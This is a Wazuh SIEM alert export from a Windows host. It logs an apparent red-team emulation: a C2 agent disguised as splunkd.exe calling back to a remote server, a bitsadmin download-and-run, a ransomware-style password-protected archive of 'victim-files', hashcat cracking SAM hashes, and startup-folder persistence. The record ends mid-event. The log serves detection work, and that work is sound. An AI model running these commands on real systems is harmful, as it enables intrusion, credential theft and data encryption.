wazuh-alerts-4.x-2024.11.30,TPrqe5MBRlc-D5DFKB4l,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 07:12:36.554
ProcessGuid: {15959494-BAE4-674A-3D06-000000000D00}
ProcessId: 1988
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C if not exist ""%%programfiles%%/WinRAR/Rar.exe""  ( call ) ELSE ( echo Downloading Winrar installer && bitsadmin /transfer myDownloadJob /download /priority normal ""https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe"" %%TEMP%%\winrar.exe && %%TEMP%%\winrar.exe /S ) &&   &&  mkdir .\tmp\victim-files && cd .\tmp\victim-files && echo ""This file will be encrypted"" > .\encrypted_file.txt && ""%%programfiles%%/WinRAR/Rar.exe"" a -hp""blue"" hello.rar && dir
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:12:36.556759500Z,55018,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,18,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:12:37.622",EventChannel,1732950757.1208607,"Nov 30, 2024 @ 07:12:37.622", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,1988, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-BAE4-674A-3D06-000000000D00},2024-11-30 07:12:36.554,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C if not exist \""%%programfiles%%/WinRAR/Rar.exe\""  ( call ) ELSE ( echo Downloading Winrar installer &amp;&amp; bitsadmin /transfer myDownloadJob /download /priority normal \""https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\"" %%TEMP%%\\winrar.exe &amp;&amp; %%TEMP%%\\winrar.exe /S ) &amp;&amp;   &amp;&amp;  mkdir .\\tmp\\victim-files &amp;&amp; cd .\\tmp\\victim-files &amp;&amp; echo \""This file will be encrypted\"" &gt; .\\encrypted_file.txt &amp;&amp; \""%%programfiles%%/WinRAR/Rar.exe\"" a -hp\""blue\"" hello.rar &amp;&amp; dir",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,UPrse5MBRlc-D5DFJB7L,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 07:14:44.714
ProcessGuid: {15959494-BB64-674A-4006-000000000D00}
ProcessId: 5308
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C cd PathToAtomicsFolder\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe\.. && PathToAtomicsFolder\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule c5068b_sam.txt cab59f_password.lst
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:14:44.719762500Z,55045,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,19,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:14:45.809",EventChannel,1732950885.1224952,"Nov 30, 2024 @ 07:14:45.809", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5308, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-BB64-674A-4006-000000000D00},2024-11-30 07:14:44.714,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,cmd.exe /C cd PathToAtomicsFolder\\..\\ExternalPayloads\\hashcat6\\hashcat-6.1.1\\hashcat.exe\\.. &amp;&amp; PathToAtomicsFolder\\..\\ExternalPayloads\\hashcat6\\hashcat-6.1.1\\hashcat.exe -a 0 -m 1000 -r .\\rules\\Incisive-leetspeak.rule c5068b_sam.txt cab59f_password.lst,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,Tvrre5MBRlc-D5DFJh4W,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1187,technique_name=Forced Authentication
UtcTime: 2024-11-30 07:13:42.780
ProcessGuid: {15959494-BB26-674A-3F06-000000000D00}
ProcessId: 388
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk
CreationUtcTime: 2024-11-25 21:48:03.822
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T07:13:42.781810100Z,55038,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,9,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe created a new scripting file under Windows Temp or User data folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92201, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:13:43.881",EventChannel,1732950823.1219772,"Nov 30, 2024 @ 07:13:43.881", , , , , , , , , , , , ,388, , , , , , , , , , ,"[""Ingress Tool Transfer"",""Command and Scripting Interpreter""]","[""T1105"",""T1059""]","[""Command and Control"",""Execution""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-BB26-674A-3F06-000000000D00},2024-11-30 07:13:42.780, ,"technique_id=T1187,technique_name=Forced Authentication", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk,2024-11-25 21:48:03.822, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,T_rre5MBRlc-D5DFJh4W,1,1,192.168.117.134,window-agent3,003,Maryam, ,1014, ,0x4000000010000000,{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D},3,System,0,"""Name resolution for the name wpad timed out after none of the configured DNS servers responded.""",0,2024-11-30T07:13:45.388568200Z,2059,4140,DESKTOP-QGB4EQH,1014,1384,WARNING,Microsoft-Windows-DNS-Client,3,false,5,Name resolution for the name wpad timed out,"[""windows"",""windows_system""]",61109, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:13:46.450",EventChannel,1732950826.1222964,"Nov 30, 2024 @ 07:13:46.450", , , , , , , , , , , , , , , , , , , , , , , , , , ,128,02000000C0A87502000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,wpad, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,Rfrle5MBRlc-D5DF9R7Z,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 07:07:56.831
ProcessGuid: {15959494-B9CC-674A-3406-000000000D00}
ProcessId: 2412
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_mtfrjoaq.jxc.ps1
CreationUtcTime: 2024-11-30 07:07:56.831
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T07:07:56.840783500Z,54935,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,45,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:07:57.966",EventChannel,1732950477.1193552,"Nov 30, 2024 @ 07:07:57.966", , , , , , , , , , , , ,2412, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B9CC-674A-3406-000000000D00},2024-11-30 07:07:56.831, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mtfrjoaq.jxc.ps1,2024-11-30 07:07:56.831, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,S_rpe5MBRlc-D5DFeB5X,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 07:11:48.608
ProcessGuid: {15959494-BAB4-674A-3C06-000000000D00}
ProcessId: 5316
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_hwupgusx.hq1.ps1
CreationUtcTime: 2024-11-30 07:11:48.608
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T07:11:48.621529100Z,55010,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,49,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:11:49.755",EventChannel,1732950709.1205596,"Nov 30, 2024 @ 07:11:49.755", , , , , , , , , , , , ,5316, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-BAB4-674A-3C06-000000000D00},2024-11-30 07:11:48.608, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_hwupgusx.hq1.ps1,2024-11-30 07:11:48.608, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,Nvrfe5MBRlc-D5DFtB42,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 07:01:08.542
ProcessGuid: {15959494-B834-674A-2206-000000000D00}
ProcessId: 1920
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_2rmvkuva.ngv.ps1
CreationUtcTime: 2024-11-30 07:01:08.542
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T07:01:08.553978700Z,54841,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,42,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:01:09.664",EventChannel,1732950069.1124003,"Nov 30, 2024 @ 07:01:09.664", , , , , , , , , , , , ,1920, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B834-674A-2206-000000000D00},2024-11-30 07:01:08.542, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_2rmvkuva.ngv.ps1,2024-11-30 07:01:08.542, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,Pvrie5MBRlc-D5DFmh5z,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 07:04:16.637
ProcessGuid: {15959494-B8F0-674A-2A06-000000000D00}
ProcessId: 1916
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_b202yju0.myx.ps1
CreationUtcTime: 2024-11-30 07:04:16.637
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T07:04:16.647222900Z,54883,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,43,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:04:18.318",EventChannel,1732950258.1168583,"Nov 30, 2024 @ 07:04:18.318", , , , , , , , , , , , ,1916, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B8F0-674A-2A06-000000000D00},2024-11-30 07:04:16.637, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_b202yju0.myx.ps1,2024-11-30 07:04:16.637, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,RPrle5MBRlc-D5DFHh7_,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 07:07:01.709
ProcessGuid: {15959494-B995-674A-3306-000000000D00}
ProcessId: 1360
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_bpjbzhk3.ejp.ps1
CreationUtcTime: 2024-11-30 07:07:01.709
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T07:07:01.715632800Z,54916,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,44,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:07:02.765",EventChannel,1732950422.1190541,"Nov 30, 2024 @ 07:07:02.765", , , , , , , , , , , , ,1360, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B995-674A-3306-000000000D00},2024-11-30 07:07:01.709, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_bpjbzhk3.ejp.ps1,2024-11-30 07:07:01.709, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,pfoHfJMBRlc-D5DFjx7k,1,1,192.168.117.134,window-agent3,003,Maryam, ,7040,Service Control Manager,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},4,System,0,"""The start type of the Background Intelligent Transfer Service service was changed from auto start to demand start.""",0,2024-11-30T07:44:39.110144900Z,2064,6420,DESKTOP-QGB4EQH,0,592,INFORMATION,Service Control Manager,3,false,3,Service startup type was changed,"[""windows"",""windows_system"",""policy_changed""]",61104,"[""IV_35.7.d""]", ,windows_eventchannel,log,"Nov 30, 2024 @ 07:44:40.168",EventChannel,1732952680.1578834,"Nov 30, 2024 @ 07:44:40.168", , , , , , , , , , , , , , , , , , , ,"[""164.312.b""]","[""10.6""]","[""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,Background Intelligent Transfer Service,auto start, , ,demand start,BITS,This does not appear to be logged on Windows 2000, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,pvoHfJMBRlc-D5DFjx7k,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 07:44:44.168
ProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ProcessId: 7968
Image: C:\Users\Public\splunkd.exe
TargetFilename: C:\Windows\System32\85d52c_sys_info.js
CreationUtcTime: 2024-11-30 07:44:44.168
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T07:44:44.169034500Z,55706,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:44:45.230",EventChannel,1732952685.1580668,"Nov 30, 2024 @ 07:44:45.230", , , , , , , , , , , , ,7968, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Users\\Public\\splunkd.exe, , , , , , ,{15959494-D565-6749-1C01-000000000D00},2024-11-30 07:44:44.168, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\System32\\85d52c_sys_info.js,2024-11-30 07:44:44.168, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,qPoHfJMBRlc-D5DFjx7k,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1202,technique_name=Indirect Command Execution
UtcTime: 2024-11-30 07:44:44.178
ProcessGuid: {15959494-C26C-674A-9206-000000000D00}
ProcessId: 2076
Image: C:\Windows\System32\wscript.exe
FileVersion: 5.812.10240.16384
Description: Microsoft ® Windows Based Script Host
Product: Microsoft ® Windows Script Host
Company: Microsoft Corporation
OriginalFileName: wscript.exe
CommandLine: wscript  ""85d52c_sys_info.js""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=2661E5F3562DD03C0ED21C33E2888E2FD1137D8C,MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD
ParentProcessGuid: {15959494-C26C-674A-9106-000000000D00}
ParentProcessId: 892
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C wscript ""85d52c_sys_info.js""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:44:44.181595000Z,55711,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,6,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:44:45.290",EventChannel,1732952685.1589523,"Nov 30, 2024 @ 07:44:45.290", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,2076, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,wscript.exe,C:\\Windows\\System32\\wscript.exe,Microsoft ® Windows Script Host, , ,Microsoft ® Windows Based Script Host, , ,{15959494-C26C-674A-9206-000000000D00},2024-11-30 07:44:44.178,"SHA1=2661E5F3562DD03C0ED21C33E2888E2FD1137D8C,MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD","technique_id=T1202,technique_name=Indirect Command Execution",Microsoft Corporation,5.812.10240.16384,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-C26C-674A-9106-000000000D00},"cmd.exe /C wscript \""85d52c_sys_info.js\""",0x107a6b,892,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"wscript  \""85d52c_sys_info.js\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,sfoJfJMBRlc-D5DFeB4x,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 07:46:50.196
ProcessGuid: {15959494-C2EA-674A-9706-000000000D00}
ProcessId: 196
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_3ml2qcmp.vxl.ps1
CreationUtcTime: 2024-11-30 07:46:50.196
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T07:46:50.208855900Z,55731,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,8,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:46:51.314",EventChannel,1732952811.1610889,"Nov 30, 2024 @ 07:46:51.314", , , , , , , , , , , , ,196, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C2EA-674A-9706-000000000D00},2024-11-30 07:46:50.196, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_3ml2qcmp.vxl.ps1,2024-11-30 07:46:50.196, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,s_oJfJMBRlc-D5DFeB4x,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 07:46:51.195
ProcessGuid: {15959494-C2EB-674A-9906-000000000D00}
ProcessId: 3048
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\system32\cmd.exe"" /c ""C:\Program Files (x86)\GnuPG\bin\gpg.exe"" -c $env:temp\test.txt
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-C2EA-674A-9706-000000000D00}
ParentProcessId: 196
